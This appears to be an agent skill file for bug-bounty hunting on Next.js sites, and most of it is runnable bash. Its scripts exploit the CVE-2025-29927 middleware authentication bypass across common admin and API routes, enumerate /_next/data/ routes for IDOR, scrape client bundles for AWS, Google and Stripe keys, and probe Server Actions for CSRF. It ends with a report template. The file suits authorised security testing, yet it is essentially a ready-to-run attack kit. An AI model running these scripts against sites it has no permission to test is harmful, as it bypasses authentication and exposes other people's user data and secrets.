---
name: k1nzr3c0n-hunt-nextjs
description: "Hunt Next.js specific vulnerabilities. Middleware bypass (CVE-2025-29927 — x-middleware-subrequest header skips auth middleware), /_next/data/ IDOR (exposes SSR data for any page), _next/static bundle analysis (API routes, secrets), Build ID enumeration, getServerSideProps data exposure, Server Actions CSRF."
tags: [nextjs, react, middleware-bypass, hunt, web-security, bug-bounty]
---

# K1NZR3C0N Hunt — Next.js Specific

> **Crown jewel**: CVE-2025-29927 — x-middleware-subrequest header bypasses auth middleware entirely.
> **Fingerprint**: /_next/static/, __NEXT_DATA__ in HTML, x-powered-by: Next.js.

---

## Phase 0 — Fingerprint Next.js

```bash
TARGET="${TARGET:-}"
HUNT="/tmp/hunt_nextjs_${TARGET//[^a-zA-Z0-9]/_}"
mkdir -p "$HUNT"

echo "=== Next.js Fingerprinting ==="
curl -sI "https://${TARGET}/" | grep -i 'x-powered-by\|next\|nextjs' | sed 's/^/  /'
curl -sk "https://${TARGET}/" | grep -oP '"buildId":\s*"[^"]+"|__NEXT_DATA__' | head -5 | sed 's/^/  /'

# Get Build ID from HTML (needed for /_next/data/ routes)
BUILD_ID=$(curl -sk "https://${TARGET}/" | python3 -c "
import sys, json, re
html = sys.stdin.read()
m = re.search(r'__NEXT_DATA__[^>]+>(.*?)<', html, re.DOTALL)
if m:
    try:
        data = json.loads(m.group(1))
        print(data.get('buildId', ''))
    except: pass
" 2>/dev/null)
echo "  Build ID: ${BUILD_ID:-not found}"
export NEXT_BUILD_ID="$BUILD_ID"
```

## Phase 1 — CVE-2025-29927 Middleware Bypass

```bash
echo "=== CVE-2025-29927 — Middleware Bypass ==="
BASE="https://${TARGET}"

echo "Affects: Next.js < 15.2.3, < 14.2.25, < 13.5.9"
echo ""
echo "How it works: x-middleware-subrequest header signals 'already processed by middleware'"
echo "  Next.js skips re-running middleware → auth check bypassed"
echo ""

# Test protected routes
PROTECTED_ROUTES=(
  "/dashboard" "/admin" "/api/admin" "/account" "/profile"
  "/settings" "/api/me" "/api/user" "/app" "/internal"
)

for ROUTE in "${PROTECTED_ROUTES[@]}"; do
  NORMAL=$(curl -sk -o /dev/null -w "%{http_code}" "${BASE}${ROUTE}")
  BYPASS=$(curl -sk -o /dev/null -w "%{http_code}" "${BASE}${ROUTE}" \
    -H "x-middleware-subrequest: middleware")

  if [ "$NORMAL" != "200" ] && [ "$BYPASS" = "200" ]; then
    echo "  [BYPASS] ${ROUTE}: ${NORMAL} → ${BYPASS} with header"
    curl -sk "${BASE}${ROUTE}" -H "x-middleware-subrequest: middleware" | head -3
  elif [ "$NORMAL" = "$BYPASS" ]; then
    echo "  [SAME ${NORMAL}] ${ROUTE}"
  else
    echo "  [${NORMAL}→${BYPASS}] ${ROUTE}"
  fi
done

echo ""
echo "Also try header variants:"
echo "  x-middleware-subrequest: pages/_middleware"
echo "  x-middleware-subrequest: pages/middleware"
echo "  x-middleware-subrequest: src/middleware"
```

## Phase 2 — /_next/data/ IDOR

```bash
echo "=== /_next/data/ Route Exposure ==="
BASE="https://${TARGET}"
BUILD="${NEXT_BUILD_ID:-BUILD_ID_HERE}"

echo "Format: /_next/data/{buildId}/PAGE_PATH.json"
echo "Returns: same data as getServerSideProps — often exposes server-side fetched data"
echo ""

# Test known pages
PAGES=("index" "dashboard" "profile" "account" "admin" "settings" "users")
for PAGE in "${PAGES[@]}"; do
  URL="${BASE}/_next/data/${BUILD}/${PAGE}.json"
  CODE=$(curl -sk -o /tmp/next_data -w "%{http_code}" "$URL")
  if [ "$CODE" = "200" ]; then
    echo "  [HIT] /_next/data/${BUILD}/${PAGE}.json"
    cat /tmp/next_data | python3 -m json.tool 2>/dev/null | head -15 | sed 's/^/    /'
  fi
done

echo ""
echo "For dynamic routes (user profiles, order details):"
echo "  /_next/data/${BUILD}/user/1.json"
echo "  /_next/data/${BUILD}/user/2.json"
echo "  → If unauthenticated, this is IDOR or auth bypass"
```

## Phase 3 — Bundle Analysis

```bash
echo "=== Next.js Bundle Analysis ==="
BASE="https://${TARGET}"

echo "Fetch chunk manifest:"
curl -sk "${BASE}/_next/static/chunks/pages/_app.js" -o /tmp/app_chunk.js 2>/dev/null
curl -sk "${BASE}/_next/static/chunks/main.js" -o /tmp/main_chunk.js 2>/dev/null

# Extract API routes
echo "API routes in bundles:"
grep -ohP '(?:api/|/api/)[a-zA-Z0-9/_-]+' /tmp/app_chunk.js /tmp/main_chunk.js 2>/dev/null | \
  sort -u | sed 's/^/  /'

# Secrets in bundles
echo ""
echo "Secrets in client bundles (should NOT be here):"
for F in /tmp/app_chunk.js /tmp/main_chunk.js; do
  [ -f "$F" ] && {
    grep -oP 'AKIA[A-Z0-9]{16}' "$F" | sed 's/^/  [AWS-KEY] /'
    grep -oP 'AIza[0-9A-Za-z_-]{35}' "$F" | sed 's/^/  [GOOGLE-KEY] /'
    grep -oP 'sk_live_[0-9a-zA-Z]+' "$F" | sed 's/^/  [STRIPE] /'
  }
done

echo ""
echo "Full bundle download (for complete analysis):"
echo "  /skill k1nzr3c0n-js-analyst"
```

## Phase 4 — Server Actions CSRF

```bash
echo "=== Server Actions CSRF ==="
BASE="https://${TARGET}"
echo "Next.js 13+ Server Actions use POST with Next-Action header"
echo ""

# Detect Server Actions
curl -sk "${BASE}/" | grep -oP 'x-nextjs-action|"SERVER_ACTION"|next-action' | head -3 | sed 's/^/  [ACTION-ID] /'

echo "Test CSRF on Server Action (no CSRF token check in early Next.js versions):"
echo "  curl -X POST '${BASE}/' -H 'Next-Action: ACTION_ID_HERE' -d '{\"arg\":\"value\"}'"
echo ""
echo "If action mutates state without checking Origin → CSRF via cross-origin form POST"
```

## Gate 0

```bash
echo "=== Next.js Gate 0 ==="
echo "  □ CVE-2025-29927: protected route returns 200 with middleware bypass header"
echo "  □ /_next/data/: SSR data returned without auth (different from control)"
echo "  □ IDOR: /_next/data/BUILD/user/ID.json returns another user's data"
echo "  □ Bundle: secret key found in client-side JS bundle"
echo "  □ Server Action CSRF: state-mutating action triggered cross-origin"
echo ""
echo "  /skill k1nzr3c0n-triage"
```

## Report Formula
```
CVE-2025-29927 (Next.js middleware bypass) on [target.com]: x-middleware-subrequest header causes /dashboard and /api/admin to return 200 with full user data vs 302 redirect without header — auth middleware completely skipped
/_next/data/{buildId}/user/2.json returns user profile without auth (unauthenticated) — SSR data IDOR exposing name/email/phone for arbitrary userID
```
